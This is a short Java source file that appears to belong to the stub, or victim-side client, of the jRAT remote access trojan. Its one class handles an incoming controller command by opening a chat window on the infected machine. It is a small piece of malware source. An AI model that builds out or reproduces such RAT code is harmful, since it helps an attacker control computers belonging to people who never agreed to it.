package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.FrameChat;

public class Packet48ChatStart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.setFrameChat(new FrameChat(con));
		con.getFrameChat().setVisible(true);
	}

}
